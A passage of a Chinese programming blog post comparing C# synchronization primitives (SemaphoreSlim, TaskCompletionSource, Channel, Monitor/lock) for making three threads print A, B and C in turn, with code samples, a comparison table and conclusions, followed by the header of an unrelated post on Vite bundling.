<p><strong>改造难度：⭐⭐ 容易</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ABC_SemaphoreSlimTestCode</span>
{
    <span class="hljs-comment">// A 初始可用(1)，B、C 初始不可用(0)</span>
    <span class="hljs-keyword">private</span> SemaphoreSlim semA = <span class="hljs-keyword">new</span> SemaphoreSlim(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> SemaphoreSlim semB = <span class="hljs-keyword">new</span> SemaphoreSlim(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> SemaphoreSlim semC = <span class="hljs-keyword">new</span> SemaphoreSlim(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Print</span>()</span>
    {
        <span class="hljs-comment">// 线程 A</span>
        Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> semA.WaitAsync();   <span class="hljs-comment">// 等待 A 信号</span>
                Console.WriteLine(<span class="hljs-string">"A"</span>);
                semB.Release();           <span class="hljs-comment">// 释放 B 信号</span>
            }
        });
​
        <span class="hljs-comment">// 线程 B</span>
        Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> semB.WaitAsync();   <span class="hljs-comment">// 等待 B 信号</span>
                Console.WriteLine(<span class="hljs-string">"B"</span>);
                semC.Release();           <span class="hljs-comment">// 释放 C 信号</span>
            }
        });
​
        <span class="hljs-comment">// 线程 C</span>
        Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> semC.WaitAsync();   <span class="hljs-comment">// 等待 C 信号</span>
                Console.WriteLine(<span class="hljs-string">"C"</span>);
                semA.Release();           <span class="hljs-comment">// 释放 A 信号，形成闭环</span>
            }
        });
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用三个 <code>SemaphoreSlim</code> 对象，初始计数分别为 1（A 可用）、0（B 不可用）和 0（C 不可用）</li>
<li>每个线程执行前调用 <code>WaitAsync()</code> 等待信号</li>
<li>执行完成后，通过 <code>Release()</code> 增加下一个信号量的计数，最后一个线程释放第一个信号量形成闭环</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 改造简单，代码简洁</li>
<li>✅ 支持异步编程，使用 <code>await</code> 语法更现代</li>
<li>✅ 轻量级，性能较好</li>
<li>✅ 最适合 ABC 场景，代码清晰易维护</li>
<li>✅ 支持超时和取消操作</li>
</ul>
<h4 data-id="heading-5">3. TaskCompletionSource 实现</h4>
<p><strong>改造难度：⭐⭐⭐ 中等</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ABC_TaskCompletionSourceTestCode</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">PrintAsync</span>()</span>
    {
        <span class="hljs-keyword">var</span> tcsA = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
        <span class="hljs-keyword">var</span> tcsB = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
        <span class="hljs-keyword">var</span> tcsC = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
​
        <span class="hljs-comment">// 初始让 A 可以执行</span>
        tcsA.SetResult(<span class="hljs-literal">true</span>);
​
        <span class="hljs-comment">// 线程 A</span>
        <span class="hljs-keyword">var</span> taskA = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> tcsA.Task;     <span class="hljs-comment">// 等待 A 信号</span>
                Console.WriteLine(<span class="hljs-string">"A"</span>);
                tcsA = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
                tcsB.SetResult(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 B 可以执行</span>
            }
        });
​
        <span class="hljs-comment">// 线程 B</span>
        <span class="hljs-keyword">var</span> taskB = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> tcsB.Task;     <span class="hljs-comment">// 等待 B 信号</span>
                Console.WriteLine(<span class="hljs-string">"B"</span>);
                tcsB = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
                tcsC.SetResult(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 C 可以执行</span>
            }
        });
​
        <span class="hljs-comment">// 线程 C</span>
        <span class="hljs-keyword">var</span> taskC = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> tcsC.Task;     <span class="hljs-comment">// 等待 C 信号</span>
                Console.WriteLine(<span class="hljs-string">"C"</span>);
                tcsC = <span class="hljs-keyword">new</span> TaskCompletionSource&lt;<span class="hljs-built_in">bool</span>&gt;(TaskCreationOptions.RunContinuationsAsynchronously);
                tcsA.SetResult(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 A 可以执行，形成闭环</span>
            }
        });
​
        <span class="hljs-keyword">await</span> Task.WhenAll(taskA, taskB, taskC);
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用三个 <code>TaskCompletionSource</code> 对象</li>
<li>初始时，将 A 的任务标记为完成，允许 A 立即执行</li>
<li>每个线程执行前等待对应的 <code>Task</code> 完成</li>
<li>执行完成后，创建新的 <code>TaskCompletionSource</code> 对象，并将下一个线程的任务标记为完成，最后一个线程通知第一个线程形成闭环</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 支持异步编程模型</li>
<li>✅ 可以传递实际数据，不仅仅是信号</li>
<li>❌ 每次迭代都需要创建三个新的 <code>TaskCompletionSource</code> 对象，内存开销较大</li>
<li>❌ 代码相对复杂，需要理解异步编程模型</li>
<li>❌ 对于纯信号控制场景，有点杀鸡用牛刀</li>
</ul>
<h4 data-id="heading-6">4. Channel 实现</h4>
<p><strong>改造难度：⭐⭐ 容易</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ABC_ChannelTestCode</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">PrintAsync</span>()</span>
    {
        <span class="hljs-keyword">var</span> chA = Channel.CreateUnbounded&lt;<span class="hljs-built_in">bool</span>&gt;();
        <span class="hljs-keyword">var</span> chB = Channel.CreateUnbounded&lt;<span class="hljs-built_in">bool</span>&gt;();
        <span class="hljs-keyword">var</span> chC = Channel.CreateUnbounded&lt;<span class="hljs-built_in">bool</span>&gt;();
​
        <span class="hljs-comment">// 初始让 A 可以执行</span>
        <span class="hljs-keyword">await</span> chA.Writer.WriteAsync(<span class="hljs-literal">true</span>);
​
        <span class="hljs-comment">// 线程 A</span>
        <span class="hljs-keyword">var</span> taskA = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> chA.Reader.ReadAsync(); <span class="hljs-comment">// 等待 A 信号</span>
                Console.WriteLine(<span class="hljs-string">"A"</span>);
                <span class="hljs-keyword">await</span> chB.Writer.WriteAsync(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 B 可以执行</span>
            }
        });
​
        <span class="hljs-comment">// 线程 B</span>
        <span class="hljs-keyword">var</span> taskB = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> chB.Reader.ReadAsync(); <span class="hljs-comment">// 等待 B 信号</span>
                Console.WriteLine(<span class="hljs-string">"B"</span>);
                <span class="hljs-keyword">await</span> chC.Writer.WriteAsync(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 C 可以执行</span>
            }
        });
​
        <span class="hljs-comment">// 线程 C</span>
        <span class="hljs-keyword">var</span> taskC = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-keyword">await</span> chC.Reader.ReadAsync(); <span class="hljs-comment">// 等待 C 信号</span>
                Console.WriteLine(<span class="hljs-string">"C"</span>);
                <span class="hljs-keyword">await</span> chA.Writer.WriteAsync(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 通知 A 可以执行，形成闭环</span>
            }
        });
​
        <span class="hljs-keyword">await</span> Task.WhenAll(taskA, taskB, taskC);
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用三个 <code>Channel</code> 对象创建无界通道</li>
<li>初始时，向 A 通道写入数据，允许 A 立即执行</li>
<li>每个线程从自己的通道读取数据（等待信号）</li>
<li>执行完成后，向下一个通道写入数据（发送信号），最后一个线程向第一个通道写入数据形成闭环</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 现代异步编程模型，设计优雅</li>
<li>✅ 高性能，适合高并发场景</li>
<li>✅ 可以轻松扩展为传递复杂数据</li>
<li>❌ 需要 .NET Core 3.0+ 或 .NET 5+ 支持</li>
<li>❌ 对于纯信号控制场景，可能显得过于复杂</li>
</ul>
<h4 data-id="heading-7">5. Monitor/lock 实现</h4>
<p><strong>改造难度：⭐⭐⭐⭐ 困难</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">internal <span class="hljs-keyword">class</span> <span class="hljs-title class_">ABC_MonitorLockTestCode</span>
{
    <span class="hljs-keyword">private</span> object lockObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> turn = <span class="hljs-number">0</span>; <span class="hljs-comment">// 0=A, 1=B, 2=C</span>
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// 线程 A</span>
        <span class="hljs-built_in">Task</span>.<span class="hljs-built_in">Run</span>(() =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-built_in">lock</span> (lockObj)
                {
                    <span class="hljs-keyword">while</span> (turn != <span class="hljs-number">0</span>) <span class="hljs-comment">// 等待自己的回合</span>
                    {
                        Monitor.<span class="hljs-built_in">Wait</span>(lockObj); <span class="hljs-comment">// 释放锁并等待信号</span>
                    }
                    
                    <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>(<span class="hljs-string">"A"</span>);
                    turn = <span class="hljs-number">1</span>; <span class="hljs-comment">// 切换到 B 回合</span>
                    Monitor.<span class="hljs-built_in">PulseAll</span>(lockObj); <span class="hljs-comment">// 唤醒所有等待的线程</span>
                }
            }
        });
​
        <span class="hljs-comment">// 线程 B</span>
        <span class="hljs-built_in">Task</span>.<span class="hljs-built_in">Run</span>(() =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-built_in">lock</span> (lockObj)
                {
                    <span class="hljs-keyword">while</span> (turn != <span class="hljs-number">1</span>) <span class="hljs-comment">// 等待自己的回合</span>
                    {
                        Monitor.<span class="hljs-built_in">Wait</span>(lockObj); <span class="hljs-comment">// 释放锁并等待信号</span>
                    }
                    
                    <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>(<span class="hljs-string">"B"</span>);
                    turn = <span class="hljs-number">2</span>; <span class="hljs-comment">// 切换到 C 回合</span>
                    Monitor.<span class="hljs-built_in">PulseAll</span>(lockObj); <span class="hljs-comment">// 唤醒所有等待的线程</span>
                }
            }
        });
​
        <span class="hljs-comment">// 线程 C</span>
        <span class="hljs-built_in">Task</span>.<span class="hljs-built_in">Run</span>(() =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-built_in">lock</span> (lockObj)
                {
                    <span class="hljs-keyword">while</span> (turn != <span class="hljs-number">2</span>) <span class="hljs-comment">// 等待自己的回合</span>
                    {
                        Monitor.<span class="hljs-built_in">Wait</span>(lockObj); <span class="hljs-comment">// 释放锁并等待信号</span>
                    }
                    
                    <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>(<span class="hljs-string">"C"</span>);
                    turn = <span class="hljs-number">0</span>; <span class="hljs-comment">// 切换到 A 回合，形成闭环</span>
                    Monitor.<span class="hljs-built_in">PulseAll</span>(lockObj); <span class="hljs-comment">// 唤醒所有等待的线程</span>
                }
            }
        });
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用一个共享的 <code>lockObj</code> 作为同步对象</li>
<li>使用一个整数变量 <code>turn</code> 来跟踪当前应该执行的线程（0=A, 1=B, 2=C）</li>
<li>每个线程在执行前检查是否是自己的回合，如果不是则等待</li>
<li>执行完成后，切换回合状态并唤醒所有等待的线程</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 不需要额外的同步原语，只使用 .NET 内置的 Monitor 机制</li>
<li>❌ 改造复杂，代码冗长</li>
<li>❌ 不支持异步编程，会阻塞线程</li>
<li>❌ 需要使用 <code>PulseAll()</code> 唤醒所有线程，性能较差</li>
<li>❌ 三个线程竞争锁，容易导致不必要的唤醒</li>
<li>❌ 代码复杂度指数增长，难以维护</li>
</ul>
<h4 data-id="heading-8">6. 混合方案：流水线 Channel 实现</h4>
<p><strong>改造难度：⭐⭐ 容易</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ABC_PipelineChannelTestCode</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">PrintAsync</span>()</span>
    {
        <span class="hljs-comment">// 创建两个通道，形成 A → B → C 的流水线</span>
        <span class="hljs-keyword">var</span> abChannel = Channel.CreateUnbounded&lt;<span class="hljs-built_in">string</span>&gt;();
        <span class="hljs-keyword">var</span> bcChannel = Channel.CreateUnbounded&lt;<span class="hljs-built_in">string</span>&gt;();
​
        <span class="hljs-comment">// 线程 A - 生产数据</span>
        <span class="hljs-keyword">var</span> taskA = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-built_in">string</span> data = <span class="hljs-string">$"A-<span class="hljs-subst">{i}</span>"</span>;
                Console.WriteLine(<span class="hljs-string">$"A: <span class="hljs-subst">{data}</span>"</span>);
                <span class="hljs-keyword">await</span> abChannel.Writer.WriteAsync(data); <span class="hljs-comment">// 传递给 B</span>
            }
            abChannel.Writer.Complete(); <span class="hljs-comment">// 完成写入</span>
        });
​
        <span class="hljs-comment">// 线程 B - 处理数据</span>
        <span class="hljs-keyword">var</span> taskB = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">await</span> <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> data <span class="hljs-keyword">in</span> abChannel.Reader.ReadAllAsync())
            {
                <span class="hljs-built_in">string</span> processedData = <span class="hljs-string">$"B-<span class="hljs-subst">{data}</span>"</span>;
                Console.WriteLine(<span class="hljs-string">$"B: <span class="hljs-subst">{processedData}</span>"</span>);
                <span class="hljs-keyword">await</span> bcChannel.Writer.WriteAsync(processedData); <span class="hljs-comment">// 传递给 C</span>
            }
            bcChannel.Writer.Complete(); <span class="hljs-comment">// 完成写入</span>
        });
​
        <span class="hljs-comment">// 线程 C - 消费数据</span>
        <span class="hljs-keyword">var</span> taskC = Task.Run(<span class="hljs-keyword">async</span> () =&gt;
        {
            <span class="hljs-keyword">await</span> <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> data <span class="hljs-keyword">in</span> bcChannel.Reader.ReadAllAsync())
            {
                <span class="hljs-built_in">string</span> finalData = <span class="hljs-string">$"C-<span class="hljs-subst">{data}</span>"</span>;
                Console.WriteLine(<span class="hljs-string">$"C: <span class="hljs-subst">{finalData}</span>"</span>);
            }
        });
​
        <span class="hljs-keyword">await</span> Task.WhenAll(taskA, taskB, taskC);
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用两个 <code>Channel</code> 对象创建流水线</li>
<li>线程 A 生产数据并写入第一个通道</li>
<li>线程 B 从第一个通道读取数据，处理后写入第二个通道</li>
<li>线程 C 从第二个通道读取数据并消费</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 非常适合需要传递数据的场景</li>
<li>✅ 现代异步编程模型，设计优雅</li>
<li>✅ 高性能，适合高并发场景</li>
<li>✅ 代码逻辑清晰，易于理解</li>
<li>❌ 对于纯信号控制场景，可能显得过于复杂</li>
<li>❌ 需要 .NET Core 3.0+ 或 .NET 5+ 支持</li>
</ul>
<h3 data-id="heading-9">实现方式对比</h3>















































<table><thead><tr><th>实现方式</th><th>改造难度</th><th>ABC 适合度</th><th>推荐场景</th></tr></thead><tbody><tr><td>AutoResetEvent</td><td>⭐⭐</td><td>⭐⭐⭐</td><td>传统同步，无 async/await</td></tr><tr><td>SemaphoreSlim</td><td>⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>现代异步，首选</td></tr><tr><td>TaskCompletionSource</td><td>⭐⭐⭐</td><td>⭐⭐</td><td>需传递复杂数据</td></tr><tr><td>Channel</td><td>⭐⭐</td><td>⭐⭐⭐</td><td>高并发+数据传递</td></tr><tr><td>Monitor/lock</td><td>⭐⭐⭐⭐</td><td>⭐</td><td>简单场景，避免多信号</td></tr><tr><td>流水线 Channel</td><td>⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>数据流转（A→B→C）</td></tr></tbody></table>
<h3 data-id="heading-10">通用模式：扩展到 N 个线程</h3>
<p>使用 <code>SemaphoreSlim</code> 可以很容易地扩展到 N 个线程的交替执行。以下是一个通用的实现模式：</p>
<pre><code class="hljs language-ini" lang="ini">internal class NThreadsSemaphoreSlimTestCode
{
    private List&lt;SemaphoreSlim&gt; semaphores<span class="hljs-comment">;</span>
    private int threadCount<span class="hljs-comment">;</span>
​
    public NThreadsSemaphoreSlimTestCode(int count)
    {
        <span class="hljs-attr">threadCount</span> = count<span class="hljs-comment">;</span>
        <span class="hljs-attr">semaphores</span> = new List&lt;SemaphoreSlim&gt;()<span class="hljs-comment">;</span>
        
        // 初始化信号量，第一个初始可用，其余初始不可用
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; count; i++)</span>
        {
            semaphores.Add(new SemaphoreSlim(<span class="hljs-attr">i</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>, <span class="hljs-number">1</span>))<span class="hljs-comment">;</span>
        }
    }
​
    public void Print()
    {
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++)</span>
        {
            int <span class="hljs-attr">threadIndex</span> = i<span class="hljs-comment">;</span>
            char <span class="hljs-attr">threadChar</span> = (char)(<span class="hljs-string">'A'</span> + threadIndex)<span class="hljs-comment">;</span>
            
            Task.Run(async () =&gt;
            {
                for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; 100; j++)</span>
                {
                    // 等待自己的信号
                    await semaphores<span class="hljs-section">[threadIndex]</span>.WaitAsync()<span class="hljs-comment">;</span>
                    Console.WriteLine(threadChar)<span class="hljs-comment">;</span>
                    
                    // 释放下一个线程的信号，最后一个线程释放第一个线程的信号
                    int <span class="hljs-attr">nextIndex</span> = (threadIndex + <span class="hljs-number">1</span>) % threadCount<span class="hljs-comment">;</span>
                    semaphores<span class="hljs-section">[nextIndex]</span>.Release()<span class="hljs-comment">;</span>
                }
            })<span class="hljs-comment">;</span>
        }
    }
}
​
// 使用示例：
// var <span class="hljs-attr">nThreadsTest</span> = new NThreadsSemaphoreSlimTestCode(<span class="hljs-number">5</span>)<span class="hljs-comment">; // 5个线程，交替打印 ABCDE</span>
// nThreadsTest.Print()<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-11">结论</h3>
<p>从两种线程扩展到三种线程（ABC）的交替执行，不同实现方式的表现差异更加明显：</p>
<ol start="0">
<li><strong>SemaphoreSlim</strong> 仍然是最佳选择，代码简洁、支持异步、性能良好，尤其是在多线程场景下优势更加突出。</li>
<li><strong>AutoResetEvent</strong> 也是一个不错的选择，改造简单，适合传统同步场景。</li>
<li><strong>Channel</strong> 在需要传递数据的场景下表现优异，尤其是流水线模式非常适合数据处理流程。</li>
<li><strong>TaskCompletionSource</strong> 虽然可以实现，但在多线程场景下代码膨胀严重，内存开销较大。</li>
<li><strong>Monitor/lock</strong> 在多线程场景下表现最差，代码复杂，性能较差，不推荐使用。</li>
</ol>
<p>选择哪种实现方式，取决于具体的场景需求：</p>
<ul>
<li><strong>纯信号控制</strong>（ABCABC）：首选 <code>SemaphoreSlim</code>，代码最简洁，性能最好。</li>
<li><strong>需要传递数据</strong>：首选 <code>Channel</code> 流水线模式，尤其是在 A→B→C 需要处理数据的场景。</li>
<li><strong>传统同步场景</strong>：选择 <code>AutoResetEvent</code>，兼容性好，易于理解。</li>
<li><strong>特殊需求</strong>：根据具体情况选择其他实现方式。</li>
</ul>
<p>通过本文的扩展，我们可以看到令牌环式同步模式的灵活性和多样性，以及不同同步原语在不同场景下的适用情况。了解这些实现方式，有助于我们在实际项目中选择合适的同步机制，编写高效、可靠的并发代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite + Rollup 打包分包陷阱：依赖版本冲突与状态隔离问题]]></title>    <link>https://juejin.cn/post/7605769126272352302</link>    <guid>https://juejin.cn/post/7605769126272352302</guid>    <pubDate>2026-02-13T04:34:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126272352302" data-draft-id="7605856048361373734" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite + Rollup 打包分包陷阱：依赖版本冲突与状态隔离问题"/> <meta itemprop="keywords" content="前端框架"/> <meta itemprop="datePublished" content="2026-02-13T04:34:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户9823610790277"/> <meta itemprop="url" content="https://juejin.cn/user/545774580012813"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite + Rollup 打包分包陷阱：依赖版本冲突与状态隔离问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/545774580012813/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户9823610790277
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T04:34:16.000Z" title="Fri Feb 13 2026 04:34:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item 